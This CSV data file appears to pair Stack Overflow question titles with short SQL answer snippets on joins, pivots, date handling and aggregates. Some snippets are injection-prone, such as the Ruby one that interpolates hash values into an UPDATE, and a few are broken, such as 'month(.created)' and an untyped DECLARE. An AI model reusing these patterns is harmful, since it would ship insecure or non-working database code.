,Unnamed: 0,NL,Code
28863,50017,Joining Multiple Large Tables,"select t1.a, t1.b
into t4
from t1
join t2 on t1.a = t2.a and t1.c = t2.c
join t3 on t1.a = t3.a and t1.c = t3.c
where t3.e / t2.d < x
"
37341,73186,How many chars are available in nvarchar(MAX),"declare @string nvarchar(MAX) = ''
select datalength(@string), LEN(@string)
GO

declare @string nvarchar(MAX) = '1'
select datalength(@string), LEN(@string)
"
14880,15371,How to search a column name within all tables of a database,"select table_name, column_name
from user_tab_columns
where column_name like '%AUTHOR%';
"
5166,35763,How to: Find and update all the entries where the value in one column shows up more than once,"UPDATE tbl a
INNER JOIN
    (
        SELECT subid
        FROM tbl
        GROUP BY subid
        HAVING COUNT(*) > 1 AND SUM(author_id = 111) > 0
    ) b ON a.subid = b.subid
SET a.ordering = (a.author_id = 111)
"
5457,16530,using while loop not looping through date properly,"declare @currentDate datetime,@enddate datetime

set @currentDate = '20150601'
set @enddate='20150605'

while (@currentDate <= @enddate) begin
  select @currentDate as currentdate
  select @currentDate = dateadd(DAY,1,@currentDate)
end
"
14255,51104,Extract data from multiple tables,"declare @TableA as table (inv int, amount int, disc int)
declare @TableB as table (inv int, description varchar(50), amount int)

insert into @TableA values (1001, 1500, 105)
insert into @TableA values (1002, 3000, 300)

insert into @TableB values (1001, 'CHARGES', 100)
insert into @TableB values (1001, 'FREIGHT', 30)
insert into @TableB values (1001, 'INSURANCE', 20)
insert into @TableB values (1002, 'CHARGES', 215)
insert into @TableB values (1002, 'FREIGHT', 32)
insert into @TableB values (1002, 'INSURANCE', 25)

select
    A.inv,
    A.amount,
    A.disc,
    B.charges,
    B.freight,
    B.insurance
from @TableA as A
    inner join (
                SELECT t.inv,
                       MAX(CASE WHEN t.description = 'CHARGES' THEN t.amount ELSE NULL END) AS charges,
                       MAX(CASE WHEN t.description = 'FREIGHT' THEN t.amount ELSE NULL END) AS freight,
                       MAX(CASE WHEN t.description = 'INSURANCE' THEN t.amount ELSE NULL END) AS insurance
                FROM @TableB as t
                GROUP BY t.inv) as B
        on A.inv = B.inv
where
    B.charges = 100 and
    A.inv = 1001
"
29689,30193,MYSQL (NOT IN) query is very slow,"ALTER TABLE `table2` ADD INDEX (`name`)
"
18852,36286,SQL Match employee intime (punch time) with employee shift,"select ads.attendancesumid,
       ads.employeeid,
       ads.date,
       ads.day,
       ads.intime,
       ads.outtime,
       ss.intime,
       ss.outtime
  from employee_attendance_daily_summary ads
  join employee emp
    on emp.employeeid = ads.employeeid
  join setup_shift ss
    on ss.shiftcode = emp.shiftcode
   and datepart(dw, ads.date) = ss.day
 where ads.employeeid = 4
   and ((abs(datediff(hh,
                      cast(ads.intime as datetime),
                      cast(ss.intime as datetime))) between 0 and 2) or
       (ads.intime = '00:00:00' and
       ss.intime =
       (select min(x.intime)
            from setup_shift x
           where x.shiftcode = ss.shiftcode
             and x.intime > (select min(y.intime)
                               from setup_shift y
                              where y.shiftcode = x.shiftcode))))
"
33965,61305,MySql JOIN on most recent start_date?,"SELECT t.event_date, t.amount, p.percent
FROM bedic_sixsummits_transactions AS t
LEFT JOIN bedic_sixsummits_percent AS p
ON p.effective = 
   ( SELECT MAX( p2.effective ) FROM bedic_sixsummits_percent AS p2
     WHERE p2.effective <= t.event_date
   )
ORDER BY t.event_date DESC LIMIT 0 , 30
"
20782,16980,Combine two different unrelated SQL queries( returning single column results) into one query result with two columns,"SELECT
   (
      select SUM(MarksObtained)  
      from tbAnswers where QID IN (
          Select QID from tbQuestions where ExamID = 2
      )
   ) as MarksObtained,
   (
       Select SUM(Marks)   
       from tbQuestions where ExamID = 2
   ) as MaxMarks
"
25381,55203,Oracle Insert with mutli-valued column,"insert into onTeam(date, player, teamName) 
select 'newDate','Matt Holliday', teamName 
from onTeam where player = 'Matt Holliday'
"
13833,51007,sql join two tables with 0 values,"select coalesce(a.id, b.id) as id,
       coalesce(a.income, 0) as income,
       coalesce(b.outcome, 0) as outcome,
       (coalesce(a.income, 0) - coalesce(b.outcome, 0)) as balance
from tablea a full outer join
     tableb b
     on a.id = b.id;
"
3913,73187,Null Processing in MS SQL Server 2008,"COALESCE(MiddleInitial,'') AS MiddleInitial   
"
25909,63930,Import list into SQL,"LOAD DATA LOCAL INFILE '/path/myfile.txt' INTO TABLE mytable;
"
17300,51682,Duplicate records with postgres,"SELECT s.stop_name, min(st.departure_time) departure_time
  FROM stops s
    INNER JOIN stop_times st
      ON s.stop_id = st.stop_id
    INNER JOIN (
      SELECT DISTINCT t.trip_id, t.route_id
        FROM trips t, northbound nb
        WHERE t.trip_id LIKE CONCAT(nb.train_id,'%')
        AND t.route_id = '2'
    ) TR
      ON TR.trip_id = st.trip_id
WHERE st.departure_time > 1373948273
GROUP BY s.stop_name 
"
37802,40094,Construct SQL statement from Ruby Hash,"h = {:country => ""Thailand"", :postal_code => ""10110""}
""UPDATE table SET #{h.map { |k, v| ""#{k} = '#{v}'"" }.join(', ')} WHERE id = 1;""
# ""UPDATE table SET country = 'Thailand', postal_code = '10110' WHERE id = 1;""
"
18906,20452,How to insert one column into other column within the same table in SQL Server,"UPDATE table
SET col_2 = col_1
"
39349,41216,Get monthly reports on SQl even if null,"   select
        month(date_reception),
        count(mc_object)
    from
        [full]
    where
        date_reception > '2015-01-01'
        and date_reception < '2015-06-26'
        and (mc_object LIKE '%obj1%' OR mc_object is null) 
    group by
        (month(date_reception))
"
23598,35681,T-SQL. Still need an identity value from SuperType table although there are no values to insert,"CREATE TABLE dbo.SuperType (SuperTypeId INT NOT NULL IDENTITY PRIMARY KEY);

INSERT INTO dbo.SuperType DEFAULT VALUES;

SELECT SCOPE_IDENTITY();
"
27900,54671,SQL query to get top 10 of a new column generated by SUM,"ORDER BY Total DESC
LIMIT 10
"
18550,24787,How can I declare a Boolean parameter in SQL statement?,"DECLARE @MyVar bit
Set @MyVar = 1  /* True */
Set @MyVar = 0  /* False */

SELECT * FROM [MyTable] WHERE MyBitColumn = @MyVar
"
18780,48063,How to fill a varchar with a number of occurences of a pattern,"SELECT id,
    CONCAT(amounts, REPEAT('|', 5 - GroupCount)) AS amounts,
    CONCAT(issueDates, REPEAT('|', 5 - GroupCount)) AS issueDates,
    CONCAT(bonusAmounts, REPEAT('|', 5 - GroupCount)) AS bonusAmounts
FROM
(
    SELECT
        p.id,  
        GROUP_CONCAT(t1.amount SEPARATOR ""|"") as amounts,  
        GROUP_CONCAT(t1.issueDate SEPARATOR ""|"") as issueDates,   
        GROUP_CONCAT(t2.amountInEuro*100/t1.amountInEuro SEPARATOR ""|"") as bonusAmounts,
        COUNT(*) AS GroupCount 
    FROM Transaction t1 
    JOIN Player p 
    ON p.id = t1.player_id 
    INNER JOIN (SELECT player_id, COUNT(*) FROM Transaction WHERE issueDate BETWEEN '2010-07-03 00:00:00' AND '2013-07-03 23:59:59' GROUP BY player_id) tr
    ON tr.player_id = t1.player_id
    LEFT OUTER JOIN Transaction t2
    ON t2.id = t1.deposit_id AND type = 3
    WHERE t1.type = 0 
    and t1.status = 0 
    GROUP BY t1.player_id 
    HAVING GroupCount <= 5
) Sub1
"
11779,30506,Finding Median of Dates in SQL Server 2008,"WITH
    tmp AS
    (
        SELECT invoice_no,
                dates,
                cast(count(*) OVER (PARTITION BY invoice_no) as float) AS total,
                row_number() OVER (PARTITION BY invoice_no ORDER BY dates) AS rn
        FROM    INVOICE_HEADER
    )


SELECT *
FROM tmp
WHERE (total / 2.0 - 1) < rn
    and rn < (total / 2.0 + 1)
"
16650,5016,"MYSQL Comment Counting, not working","SELECT p.*, COALESCE(COUNT(c.post_id), 0) AS numberOfComments
FROM posts p 
LEFT JOIN comments c ON c.post_id = p.post_id
WHERE p.number_of_comments = 'B'
GROUP BY p.post_id
LIMIT 0, 30;
"
15334,67457,How to return rows only if there is more than one result,"SELECT *
  FROM (SELECT col1,
               col2,
               COUNT(*) OVER() cnt
          FROM your_table
         WHERE <conditions> )
 WHERE cnt > 1
"
11195,53312,Conditionally Aggregate Rows,"select user_id, min(start_time) as start_time, max(end_time) as end_time
from (select t.*,
             sum(case when start_time > prev_end_time + interval '10' minute
                      then 1 else 0
                 end) over (partition by user_id order by start_time) as grp
      from (select t.*,
                   lag(end_time) over (partition by user_id order by start_time) as prev_end_time
            from t
           ) t
     ) t
group by grp, user_id;
"
15881,53331,Difference between UNIQUE and UNIQUE KEY mySQL,"create_definition:
    col_name column_definition
  | [CONSTRAINT [symbol]] PRIMARY KEY [index_type] (index_col_name,...)
      [index_option] ...
  | {INDEX|KEY} [index_name] [index_type] (index_col_name,...)
      [index_option] ...
  | [CONSTRAINT [symbol]] UNIQUE [INDEX|KEY]
      [index_name] [index_type] (index_col_name,...)
      [index_option] ...
  | {FULLTEXT|SPATIAL} [INDEX|KEY] [index_name] (index_col_name,...)
      [index_option] ...
  | [CONSTRAINT [symbol]] FOREIGN KEY
      [index_name] (index_col_name,...) reference_definition
  | CHECK (expr)
"
9401,9939,"SQL - Find Duplicates, then add to another table with count","INSERT INTO CustomerTotals
(CompanyName, Totals)
SELECT CompanyName, COUNT(*)
FROM Customer
GROUP BY CompanyName
"
11234,28563,Get the biggest number in database column,"SqlConnection sqlConnection1 = new SqlConnection(""Your Connection String"");
SqlCommand cmd = new SqlCommand();
SqlDataReader reader;
cmd.CommandText = ""SELECT (ISNULL(MAX(yourcolumn), 0) + 1) as BigNum FROM yourtable"";
cmd.CommandType = CommandType.Text;
cmd.Connection = sqlConnection1;
sqlConnection1.Open();
reader = cmd.ExecuteReader();
    if (reader.Read())
{
    int bingnum =Convert.ToInt32( reader[""BigNum""]);
}
sqlConnection1.Close();
"
3559,11732,Mysql - getting distinct records,"select ua.* 
from user_actions ua
join (select max(id) as max_id,user_id,action_type from user_action group by user_id,user_action) ua_max
on ua.id=ua_max.max_id and ua.user_id=ua_max.user_id and ua.action_type=ua_max.action_type
"
22641,44342,Merge Oracle groups output into 1 single row as final result,"select 'DB_QUERY1', count(1)
from test_db.new_arch
where name like 'DATA1%' or name like 'DUAL%';
"
23256,22048,Calculating Horizontal Totals in Pivot in MS SQL Server 2008,"SELECT CASE WHEN GROUPING([FCode]) = 1 THEN 'Total' ELSE [FCode] END AS [FCode],
       SUM([DMAR15]) AS DMAR15,
       SUM([DMAR02]) AS [DMAR02]
        /*TODO: Rest of columns*/
FROM   (SELECT [FCode],
               [Aggregate],
               [QName]
        FROM   [tblMiquestResults]) AS SourceTable 
PIVOT (AVG (Aggregate) FOR [QName] IN ([DMAR15], [DMAR02], [DMAR13], 
                                       [DMAR06], [PCVDR41], [PCVDR42], 
                                       [CLDP031], [CLDP003], [CLDP012], 
                                       [CLDP028], [CLDP023], [CLDP021], 
                                       [CLDP016], [CLDP022])) AS P 
GROUP BY GROUPING SETS ((FCode),())
"
32432,56490,"MySQL: Why can't I ""column_name not in (null, 'foo')""?","True
False
Unknown
"
31579,6427,How can I retrieve the logical file name of the database from backup file,"DECLARE @Table TABLE (LogicalName varchar(128),[PhysicalName] varchar(128), [Type] varchar, [FileGroupName] varchar(128), [Size] varchar(128), 
            [MaxSize] varchar(128), [FileId]varchar(128), [CreateLSN]varchar(128), [DropLSN]varchar(128), [UniqueId]varchar(128), [ReadOnlyLSN]varchar(128), [ReadWriteLSN]varchar(128), 
            [BackupSizeInBytes]varchar(128), [SourceBlockSize]varchar(128), [FileGroupId]varchar(128), [LogGroupGUID]varchar(128), [DifferentialBaseLSN]varchar(128), [DifferentialBaseGUID]varchar(128), [IsReadOnly]varchar(128), [IsPresent]varchar(128), [TDEThumbprint]varchar(128)
)
DECLARE @Path varchar(1000)='C:\SomePath\Base.bak'
DECLARE @LogicalNameData varchar(128),@LogicalNameLog varchar(128)
INSERT INTO @table
EXEC('
RESTORE FILELISTONLY 
   FROM DISK=''' +@Path+ '''
   ')

   SET @LogicalNameData=(SELECT LogicalName FROM @Table WHERE Type='D')
   SET @LogicalNameLog=(SELECT LogicalName FROM @Table WHERE Type='L')

SELECT @LogicalNameData,@LogicalNameLog
"
26730,30555,SQL Server - select into from statement?,"declare @sqlQuery = 'select column
from table_(';

set @sqlQuery = @sqlQuery + 'select id from table2)';

EXEC (@sqlQuery)
"
8285,49826,Syncing a mobile (iPhone) app with web app,"A - Adds new entry
B - Adss new entry
A - Get B's entry
B - Get A's entry
A - Update entry
B - Delete A's entry
"
35497,72490,compare two select statements in oracle SQL,"SELECT (whatever operations you gonna do) FROM dual WHERE (select sum(quantity) from Table 1 where order_number = XXXX) = (select sum(quantity) from Table 2 where order_number = XXXX);
"
25061,18366,SQL statement to update one table if value present in another,"UPDATE F4102 
SET    IBBUYR = 1009
WHERE EXISTS (
              SELECT 1
              FROM F4101 
              WHERE IMITM  = F4102.IBITM 
              AND  IMSRTX = 'RESIN'
             )
"
38409,31526,Specified DB name with previous year,"DECLARE @CURRENTYEAR  AS INT = year(getdate())
DECLARE @PREVIOUSYEAR AS INT = @CURRENTYEAR - 1

DECLARE @QUERY_ VARCHAR(2000)
SET @QUERY_ = 
'SELECT
     COL_1
    ,COL_2
    ...
FROM DB' + @CURRENTYEAR + '.DBO.TABLENAME

UNION ALL

SELECT
     COL_1
    ,COL_2
    ...
FROM DB' + @PREVIOUSYEAR + '2015.DBO.TABLENAME'

EXEC(@QUERY_)
"
5432,56587,MySQL \ join 2 tables and show results from 2 rows in one column,"SELECT p.id, GROUP_CONCAT( im.i_name SEPARATOR '; ' ) AS images
FROM products p 
LEFT JOIN images im ON (im.product_id = p.id)
WHERE p.id IN (1, 3) GROUP BY p.id
"
11615,65856,MySQL get latest 3 rows for every id in where in,"SELECT A.*, u.name 
FROM (SELECT c.*, IF(@updateId = @updateId:=update_id, @idx:=@idx+1, @idx:=0) idx 
      FROM comms c, (SELECT @updateId:=0, @idx:=0) A
      WHERE update_id IN ('1451', '1416', '1186', '1157', '1150', '1122', '1057', '914', '850', '816', '794', '790', '749', '746', '745', '744', '740')
      ORDER BY update_id, id DESC   
    ) AS A 
INNER JOIN users AS u ON u.id = A.user_id
WHERE A.idx < 3
"
20707,41940,SQL to JOIN on two different columns,"SELECT c.CONTACT,
   c.ClientID,
   c.CONTACTID
FROM CONTACT as c
INNER JOIN CONTACT_CONTACT as cc on c.CONTACTID = cc.CONTACTID1
INNER JOIN CONTACT as c2 on cc.CONTACTID2 = c2.CONTACTID
WHERE c.ClientID = 121695 
    AND cc.CONTACT1_ROLE = 'Doctor'
union
SELECT c2.CONTACT,
   c2.ClientID,
   c2.CONTACTID
FROM CONTACT as c
INNER JOIN CONTACT_CONTACT as cc on c.CONTACTID = cc.CONTACTID2
INNER JOIN CONTACT as c2 on cc.CONTACTID1 = c2.CONTACTID
WHERE c.ClientID = 121695 
    AND cc.CONTACT2_ROLE = 'Doctor'
"
23471,66217,mysql fill in missing dates for each specific value in column,"SELECT  
    year(c.datefield) as year,
    month(c.datefield) as month,
    s.subchannel,
    count(l.created)
FROM db.calendar c
    CROSS JOIN (select distinct subchannel from l_events) s
    LEFT JOIN db.l_events l
        ON (date(l.created) = c.datefield)
        AND l.subchannel = s.subchannel
Where c.datefield between '2013-10-01' and '2014-03-31' 
group by
    s.subchannel,
    year(c.created), 
    month(.created)
order by
    s.subchannel,
    year(c.created), 
    month(.created)
    ;
"
